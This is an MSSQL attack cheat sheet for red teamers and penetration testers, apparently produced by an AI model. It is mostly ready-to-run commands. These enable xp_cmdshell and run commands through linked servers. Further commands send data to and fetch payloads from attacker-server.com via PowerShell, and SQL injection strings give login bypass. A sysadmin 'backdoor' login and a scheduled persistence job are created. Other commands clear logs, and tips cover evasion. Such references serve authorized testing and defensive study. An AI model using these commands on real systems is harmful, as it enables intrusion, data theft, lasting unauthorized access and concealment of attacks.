Here's a concise **MSSQL Cheat Sheet** specifically for red team members and penetration testers, focusing on common attack vectors and techniques used in offensive security.

### MSSQL Cheat Sheet for Red Team & Penetration Testing

---

### **1. Information Gathering**

#### **Find MSSQL Version**
```sql
SELECT @@VERSION;
```

#### **Find Hostname & Server Info**
```sql
SELECT HOST_NAME(), SERVERPROPERTY('ProductVersion'), SERVERPROPERTY('ProductLevel'), SERVERPROPERTY('Edition');
```

#### **Find Current Database**
```sql
SELECT DB_NAME();
```

#### **List All Databases**
```sql
SELECT name FROM sys.databases;
```

#### **List All Tables in Current DB**
```sql
SELECT * FROM information_schema.tables;
```

#### **List All Columns in a Specific Table**
```sql
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'your_table';
```

---

### **2. Enumeration & Privilege Escalation**

#### **List All Users**
```sql
SELECT name, type_desc, create_date, modify_date FROM sys.database_principals;
```

#### **Check if Current User is SysAdmin**
```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

#### **Check User Roles**
```sql
EXEC sp_helpuser;
```

#### **Enumerate Linked Servers**
```sql
EXEC sp_linkedservers;
SELECT * FROM sys.servers;
```

#### **Find Permissions of Current User**
```sql
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
```

---

### **3. Lateral Movement & Linked Server Attacks**

#### **Execute a Command on a Linked Server**
```sql
EXEC ('SELECT @@VERSION;') AT LinkedServerName;
```

#### **Use `OPENQUERY` to Execute Commands**
```sql
SELECT * FROM OPENQUERY([LinkedServerName], 'SELECT * FROM master.sys.databases');
```

#### **Create a Linked Server**
```sql
EXEC sp_addlinkedserver @server='LinkedServer', @srvproduct='', @provider='SQLNCLI', @datasrc='IP_OR_HOSTNAME';
```

#### **Execute a Remote Command on a Linked Server (With `xp_cmdshell`)**
```sql
EXEC ('EXEC xp_cmdshell ''dir C:\'';') AT LinkedServerName;
```

---

### **4. Privilege Escalation via Stored Procedures**

#### **Enable `xp_cmdshell`**
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

#### **Execute Command Using `xp_cmdshell`**
```sql
EXEC xp_cmdshell 'whoami';
```

#### **Check if `xp_cmdshell` is Enabled**
```sql
EXEC sp_configure 'xp_cmdshell';
```

---

### **5. Data Exfiltration**

#### **Extract Data from a Table**
```sql
SELECT * FROM sensitive_table;
```

#### **Store Output of a Query into a File**
```sql
EXEC xp_cmdshell 'bcp "SELECT * FROM sensitive_table" queryout C:\output.txt -c -T -Slocalhost';
```

#### **Send Output to a Remote Server**
```sql
EXEC xp_cmdshell 'powershell.exe -Command "Invoke-WebRequest -Uri http://attacker-server.com -Method POST -Body (Get-Content C:\output.txt)"';
```

---

### **6. Code Execution**

#### **Run PowerShell from MSSQL**
```sql
EXEC xp_cmdshell 'powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadString(''http://attacker-server.com/script.ps1'')"';
```

#### **Download and Execute Payload via PowerShell**
```sql
EXEC xp_cmdshell 'powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile(''http://attacker-server.com/payload.exe'', ''C:\payload.exe''); Start-Process C:\payload.exe"';
```

---

### **7. SQL Injection**

#### **Basic Error-Based Injection**
```sql
' OR 1=1; --
```

#### **Extract Database Name via Injection**
```sql
' UNION SELECT DB_NAME(); --
```

#### **Extract Data via Injection**
```sql
' UNION SELECT username, password FROM users; --
```

#### **Bypass Login**
```sql
' OR '1'='1'; --
```

---

### **8. Persistence**

#### **Create a New User**
```sql
CREATE LOGIN backdoor WITH PASSWORD = 'SuperSecret!';
CREATE USER backdoor FOR LOGIN backdoor;
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';
```

#### **Create a Scheduled Task to Maintain Access**
```sql
EXEC msdb.dbo.sp_add_job @job_name = 'BackdoorPersistence';
EXEC msdb.dbo.sp_add_jobstep @job_name = 'BackdoorPersistence', @step_name = 'RunBackdoor', @subsystem = 'CmdExec', @command = 'powershell.exe -Command "Invoke-WebRequest -Uri http://attacker-server.com/backdoor.ps1"';
EXEC msdb.dbo.sp_add_jobschedule @job_name = 'BackdoorPersistence', @enabled = 1, @freq_type = 4, @freq_interval = 1;
```

---

### **9. Cleansing Tracks**

#### **Clear Logs**
```sql
EXEC sp_cycle_errorlog;
EXEC xp_cmdshell 'del C:\path\to\logfile.log';
```

#### **Delete Suspicious Jobs**
```sql
EXEC msdb.dbo.sp_delete_job @job_name = 'SuspiciousJob';
```

---

### **10. Defenses & Evasion**

#### **Evasion Techniques**
- **Obfuscate PowerShell**: Encode scripts with `Base64` before execution.
- **Use Web Proxies**: Direct traffic through intermediate servers to hide the source.
- **Use Trusted Processes**: Execute commands via trusted Windows services like `ntbackup`.

---

### **Key Tips for MSSQL Pentesting**
- Always check your **user privileges** (`IS_SRVROLEMEMBER`) to see if you have `sysadmin` access.
- Leverage **linked servers** for lateral movement.
- Use `xp_cmdshell` or custom stored procedures to execute system commands.
- Remember that persistence techniques, like creating new users or scheduled jobs, can help maintain access after an initial compromise.
- Be mindful of cleaning up logs and artifacts to hide your tracks.

---

This cheat sheet should give you a solid reference point for common MSSQL attacks used in red team operations. Always make sure to get proper authorization before conducting any security testing!